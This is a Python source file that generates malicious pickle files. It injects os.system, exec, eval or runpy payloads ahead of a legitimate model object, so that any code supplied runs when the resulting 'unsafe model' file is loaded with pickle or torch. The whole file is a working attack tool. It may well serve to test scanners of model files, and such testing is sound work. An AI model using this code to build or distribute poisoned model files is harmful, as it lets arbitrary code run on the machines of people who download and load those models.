from __future__ import annotations

import os
import pickle
import struct


class PickleInject:
    """Pickle injection. Pretends to be a "module" to work with torch."""

    def __init__(self, inj_objs, first=True):
        self.__name__ = "pickle_inject"
        self.inj_objs = inj_objs
        self.first = first

    class _Pickler(pickle._Pickler):
        """Reimplementation of Pickler with support for injection"""

        def __init__(self, file, protocol, inj_objs, first=True):
            super().__init__(file, protocol)
            self.inj_objs = inj_objs
            self.first = first

        def dump(self, obj):
            """Pickle data, inject object before or after"""
            if self.proto >= 2:
                self.write(pickle.PROTO + struct.pack("<B", self.proto))
            if self.proto >= 4:
                self.framer.start_framing()

            # Inject the object(s) before the user-supplied data?
            if self.first:
                # Pickle injected objects
                for inj_obj in self.inj_objs:
                    self.save(inj_obj)

            # Pickle user-supplied data
            self.save(obj)

            # Inject the object(s) after the user-supplied data?
            if not self.first:
                # Pickle injected objects
                for inj_obj in self.inj_objs:
                    self.save(inj_obj)

            self.write(pickle.STOP)
            self.framer.end_framing()

    def Pickler(self, file, protocol):
        # Initialise the pickler interface with the injected object
        return self._Pickler(file, protocol, self.inj_objs)

    class _PickleInject:
        """Base class for pickling injected commands"""

        def __init__(self, args, command=None):
            self.command = command
            self.args = args

        def __reduce__(self):
            return self.command, (self.args,)

    class System(_PickleInject):
        """Create os.system command"""

        def __init__(self, args):
            super().__init__(args, command=os.system)

    class Exec(_PickleInject):
        """Create exec command"""

        def __init__(self, args):
            super().__init__(args, command=exec)

    class Eval(_PickleInject):
        """Create eval command"""

        def __init__(self, args):
            super().__init__(args, command=eval)

    class RunPy(_PickleInject):
        """Create runpy command"""

        def __init__(self, args):
            import runpy

            super().__init__(args, command=runpy._run_code)

        def __reduce__(self):
            return self.command, (self.args, {})


def get_payload(
    command: str, malicious_code: str
) -> PickleInject.System | PickleInject.Exec | PickleInject.Eval | PickleInject.RunPy:
    """
    Get the payload based on the command and malicious code provided.

    Args:
        command: The command to execute.
        malicious_code: The malicious code to inject.

    Returns:
        The payload object based on the command.

    Raises:
        ValueError: If an invalid command is provided.
    """
    if command == "system":
        payload = PickleInject.System(malicious_code)
    elif command == "exec":
        payload = PickleInject.Exec(malicious_code)
    elif command == "eval":
        payload = PickleInject.Eval(malicious_code)
    elif command == "runpy":
        payload = PickleInject.RunPy(malicious_code)
    else:
        raise ValueError("Invalid command provided.")

    return payload


def generate_unsafe_file(
    safe_model, command: str, malicious_code: str, unsafe_model_path: str
) -> None:
    payload = get_payload(command, malicious_code)
    pickle_protocol = 4
    file_for_unsafe_model = open(unsafe_model_path, "wb")
    mypickler = PickleInject._Pickler(file_for_unsafe_model, pickle_protocol, [payload])
    mypickler.dump(safe_model)
    file_for_unsafe_model.close()
